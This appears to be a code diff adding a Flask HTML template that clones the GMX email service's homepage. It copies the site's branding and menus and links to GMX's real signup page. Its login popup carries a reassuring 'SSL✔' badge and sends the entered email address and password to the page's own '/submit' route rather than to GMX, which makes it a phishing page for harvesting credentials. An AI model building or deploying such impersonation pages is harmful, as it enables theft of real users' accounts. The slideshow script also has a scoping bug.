@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GMX Clone with Dropdowns</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/gmx.css') }}">
+    <style>
+        /* Slideshow Container */
+        .slideshow-container {
+            position: relative;
+            max-width: 60%; /* Adjust width for smaller size */
+            margin: 20px auto; /* Center the slideshow on the page */
+            border: 2px solid #ddd; /* Optional border around the slideshow */
+            border-radius: 10px; /* Optional rounded corners */
+            overflow: hidden; /* Hide any overflowing content */
+        }
+
+        /* Hide all images by default */
+        .mySlides {
+            display: none;
+        }
+
+        /* Style for each image */
+        .mySlides img {
+            width: 100%; /* Scale the images to fit the container */
+            height: auto; /* Maintain aspect ratio */
+        }
+
+        /* Fade animation */
+        .fade {
+            animation: fade 3s ease-in-out infinite;
+        }
+
+        @keyframes fade {
+            0% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        /* Previous and next buttons */
+        .prev, .next {
+            position: absolute;
+            top: 50%;
+            font-size: 18px;
+            color: white;
+            padding: 16px;
+            background-color: rgba(0, 0, 0, 0.5);
+            border: none;
+            cursor: pointer;
+            z-index: 1;
+        }
+
+        .prev { left: 0; }
+        .next { right: 0; }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <div class="navbar">
+        <div class="logo">GMX</div>
+        <div class="search-bar">
+            <input type="text" placeholder="Search">
+            <button><img src="{{ url_for('static', filename='image/icon.jpg') }}" alt="Search"></button>
+        </div>
+        <div class="nav-links">
+            <a href="https://signup.gmx.com/#.1559516-header-signup1-1">Sign up</a>
+            <a href="#" id="login-link">Log in</a>
+        </div>
+    </div>
+
+    <!-- Sub-navbar -->
+    <div class="sub-navbar">
+        <a href="#"><i class="home-icon"></i> Home</a>
+        <div class="dropdown">
+            <a href="#" class="dropbtn">Email ▼</a>
+            <div class="dropdown-content">
+                <a href="#">Personal Email</a>
+                <a href="#">Business Email</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#" class="dropbtn">Features ▼</a>
+            <div class="dropdown-content">
+                <a href="#">Spam Protection</a>
+                <a href="#">Easy Organizing</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#" class="dropbtn">Cloud ▼</a>
+            <div class="dropdown-content">
+                <a href="#">Cloud Storage</a>
+                <a href="#">File Sharing</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#" class="dropbtn">Security ▼</a>
+            <div class="dropdown-content">
+                <a href="#">Two-factor Auth</a>
+                <a href="#">Encryption</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#" class="dropbtn">Support ▼</a>
+            <div class="dropdown-content">
+                <a href="#">Contact Us</a>
+                <a href="#">Help Center</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slideshow -->
+    <div class="slideshow-container">
+        <div class="mySlides fade">
+            <img src="{{ url_for('static', filename='image/imag3.jpg') }}" alt="Slide 1">
+        </div>
+        <div class="mySlides fade">
+            <img src="{{ url_for('static', filename='image/image2.jpg') }}" alt="Slide 2">
+        </div>
+        <div class="mySlides fade">
+            <img src="{{ url_for('static', filename='image/image.jpg') }}" alt="Slide 3">
+        </div>
+        
+        <!-- Navigation buttons -->
+        <a class="prev" onclick="plusSlides(-1)">&#10094;</a>
+        <a class="next" onclick="plusSlides(1)">&#10095;</a>
+    </div>
+
+    <!-- Login Overlay and Form -->
+    <div class="overlay" id="overlay"></div>
+    <div class="login-container" id="login-container">
+        <div class="login-header">
+            <h2>Login <span class="ssl-check">SSL✔</span></h2>
+        </div>
+        <form class="login-form" action="/submit" method="POST">
+            <div class="input-group">
+                <input type="email" name="username" id="email" placeholder="Email address" required>
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <button type="submit" class="login-button">Log in</button>
+            </div>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </form>
+    <!-- JavaScript for Slideshow -->
+    <script>
+        let slideIndex = 0;
+        showSlides();
+
+        function showSlides() {
+            let slides = document.getElementsByClassName("mySlides");
+            for (let i = 0; i < slides.length; i++) {
+                slides[i].style.display = "none";  
+            }
+            slideIndex++;
+            if (slideIndex > slides.length) {slideIndex = 1}    
+            slides[slideIndex-1].style.display = "block";  
+            setTimeout(showSlides, 3000); // Change slide every 3 seconds
+        }
+
+        function plusSlides(n) {
+            slideIndex += n;
+            if (slideIndex > slides.length) {slideIndex = 1}
+            if (slideIndex < 1) {slideIndex = slides.length}
+            showSlides();
+        }
+
+        // Show the login popup and overlay
+        document.getElementById("login-link").addEventListener("click", function (event) {
+            event.preventDefault();
+            document.getElementById("login-container").style.display = "block";
+            document.getElementById("overlay").style.display = "block";
+        });
+
+        // Close the login popup and overlay
+        function closeLogin() {
+            document.getElementById("login-container").style.display = "none";
+            document.getElementById("overlay").style.display = "none";
+        }
+    </script>
+</body>
+</html>
